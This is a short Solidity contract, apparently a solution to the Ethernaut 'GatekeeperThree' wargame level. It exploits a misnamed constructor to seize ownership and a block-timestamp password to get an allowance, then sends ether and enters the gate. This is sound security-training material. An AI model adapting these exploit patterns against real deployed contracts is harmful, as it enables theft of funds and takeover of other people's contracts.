// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

interface IGateKeeper {
    function construct0r() external ;
    function createTrick() external ;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract GateKeeperThreeAttacker {
    IGateKeeper public immutable target;
    address public immutable targetAddress;

    constructor(address _targetAddress) {
        target = IGateKeeper(_targetAddress);
        targetAddress = _targetAddress;
    }

    function attack() external payable {
        target.construct0r(); // become owner
        target.createTrick(); // create SimpleTrick to set password
        target.getAllowance(block.timestamp); // pswd is block.timestamp so set allowance to true
        // send ether to target to pass gate 3
        (bool success, bytes memory data) = payable(targetAddress).call{value:msg.value}("");
        if(!success){
            revert("Couldn't send money to target");
        }
         
        target.enter(); // finally enter target
    }
}